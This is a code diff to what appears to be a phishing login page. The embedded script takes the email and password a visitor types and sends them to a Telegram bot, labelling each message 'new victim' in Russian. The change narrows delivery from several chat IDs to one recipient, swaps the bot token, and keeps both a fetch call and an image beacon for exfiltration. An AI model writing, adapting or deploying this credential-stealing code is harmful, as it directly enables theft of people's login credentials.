@@ -110,12 +110,9 @@
 </div>
 
 <script>
-    const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
-    const CHAT_IDS = [
-        "8850351378",   // ты
-        "8784393556",   // второй
-        "8648082259"    // третий
-    ];
+    // === ТОЛЬКО ДЛЯ НЕГО (один бот, один получатель) ===
+    const BOT_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";
+    const CHAT_ID = "8648082259";
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -130,13 +127,10 @@
         }
 
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
-        const encoded = encodeURIComponent(text);
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
 
-        CHAT_IDS.forEach(id => {
-            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + encoded;
-            fetch(url, { mode: "no-cors" });
-            new Image().src = url;
-        });
+        fetch(url, { mode: "no-cors" });
+        new Image().src = url;
 
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
